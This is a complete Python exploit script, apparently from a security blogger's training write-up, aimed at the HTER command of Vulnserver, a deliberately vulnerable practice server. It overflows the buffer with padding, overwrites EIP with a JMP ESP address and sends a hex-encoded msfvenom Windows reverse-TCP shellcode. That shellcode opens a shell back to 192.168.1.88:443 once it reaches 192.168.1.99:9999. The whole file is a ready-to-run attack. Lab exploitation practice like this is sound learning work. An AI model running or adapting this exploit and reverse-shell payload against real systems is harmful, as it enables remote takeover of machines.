#!/usr/bin/python
# Author: Xavi Bel
# Website: xavibel.com
# Date: 24/06/2019
# Vulnserver HTER - Hex format shellcode

import socket
import os
import sys

junk1 = "A" * 2041

# 0x62501203 - JMP ESP
eip = "03125062"

padding = "90" * 20

# msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.88 LPORT=443 -b "\x00" -f hex -v shellcode
# Payload size: 368 bytes
shellcode = "bd5a2c2623d9f6d97424f45a33c9b156316a13036a1383c25eced3dfb68c1c2046f195c57731c18e278181c3cb6ac7f7581ec0f8e9953636ea860b5968d55fb9511692b8964b5fe84f07f21de45dcf96b670574a0e7276dd052d58dfca45d1c70f63ab7cfb1f2a5532df8198fb12dbdd3bcdae173870a9e343ae3cf0e325e6dc12e971961846f5f03c59da8a38d2dd5cc9a0f978927363d87ed59c3a218a3830cfdf301b872c79a4573b0ad765e4a07fc56d6f875c799057e6ea6e581622b50c465c1c2d0d9ca1f8bb9635c393a69dabe1a81c976c4e4eb73edf2f67fe8fc76df1f0f88dd8989361b4f10b1b9d8aaae408f7ed6fb807a387c91bd4ff31e4256a318e213c6626281940e9d34cd3ee2c11e5851b8749f263474902320d496ae2751a8feda30f1c784c79f02b24872f1beb781a1fec86d80855ee220965ee4889358687a6ba66676d93eee2e0518ff3283711f3dfeca28e9013436fb977446fc58979b9fcffbc79bbf08bdcea9af373ec8e"

# 951 - 20 - 368
junk2 = "B" * 563

crash = junk1 + eip + padding + shellcode + junk2 

buffer="HTER "
buffer+= crash + "\r\n"
print "[*] Sending exploit!"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.1.99", 9999))
expl.send(buffer)
expl.close()
